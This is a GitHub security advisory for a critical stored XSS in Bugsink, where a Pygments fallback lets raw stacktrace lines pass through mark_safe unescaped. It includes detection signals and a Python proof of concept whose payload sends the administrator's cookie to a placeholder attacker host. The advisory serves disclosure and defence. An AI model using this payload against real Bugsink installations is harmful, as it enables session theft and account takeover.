# [C] Bugsink is vulnerable to Stored XSS via Pygments fallback in stacktrace rendering

## Summary
Severity: Critical
Advisory: GHSA-vp6q-7m36-pq3w
CVE: CVE-2026-27614
CWE: CWE-79
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N (CVSS_V3)
Published: 2026-02-25
Source: https://github.com/advisories/GHSA-vp6q-7m36-pq3w
Type: github-advisory

## Affected
- PyPI: `bugsink` — affected >=0 <2.0.13

## Details
### Summary

An unauthenticated attacker who can submit events to a Bugsink project can store arbitrary JavaScript in an event.
The payload executes only if a user explicitly views the affected Stacktrace in the web UI.

### Details

When Pygments returns more lines than it was given (a known upstream quirk that triggers with Ruby heredoc-style input), `_pygmentize_lines()` in `theme/templatetags/issues.py:75-77` falls back to returning the raw input lines. `mark_safe()` at line 111-113 is then applied unconditionally - including to those unsanitized raw lines. Since DSN endpoints are public by Sentry protocol, no account is needed to inject. The payload sits in the database until an admin looks at the event.

```python
# issues.py:75-77 - fallback path, no escaping
if len(pygmented) != len(lines):
    return lines  # raw HTML returned here

# issues.py:111-113 - unconditional mark_safe
return [mark_safe(line) for line in result]
```

### Operational Signals

Exploitation attempts are likely to generate the diagnostic event:

```
"Pygments line count mismatch, falling back to unformatted code"
```

Installations that monitor Bugsink with Bugsink (or otherwise alert on internal errors)
may see this message as an issue. While the condition can occur benignly, unexpected
occurrences, especially from unusual languages (specifically ruby), warrant review.


### PoC

Send a Sentry event to `/api/<project-id>/store/` with a valid DSN:

```python
import requests

payload = {
    "exception": {"values": [{"stacktrace": {"frames": [{
        "filename": "app.rb",
        "lineno": 2,
        "pre_context": ["<<~HEREDOC", "  foo", "HEREDOC"],
        "context_line": "<img src=x onerror=fetch('//attacker/?c='+document.cookie)>",
        "post_context": []
    }]}}]}
}

requests.post(
    "http://bugsink-host/api/<project-id>/store/",
    json=payload,
    headers={"X-Sentry-Auth": "Sentry sentry_key=<dsn-public-key>, sentry_version=7"}
)
```

Open the event in the bugsink UI as any admin. Cookie exfiltrates immediately.

### Impact

This is a stored XSS vulnerability.

Successful exploitation requires:

* The attacker can submit events to the project (i.e. knows the DSN or can access a client that uses it).
* The Bugsink ingest endpoint is reachable to the attacker.
* An administrator explicitly views the crafted event in the UI.

Under those conditions, the attacker can execute JavaScript in the administrator’s browser
and act with that user’s privileges within Bugsink.

## References
- https://github.com/bugsink/bugsink/security/advisories/GHSA-vp6q-7m36-pq3w
- https://nvd.nist.gov/vuln/detail/CVE-2026-27614
- https://github.com/bugsink/bugsink/commit/e784d6aeb0d5f29b40c2779d2544c2b9ef097ee9
- https://github.com/bugsink/bugsink
- https://github.com/bugsink/bugsink/releases/tag/2.0.13
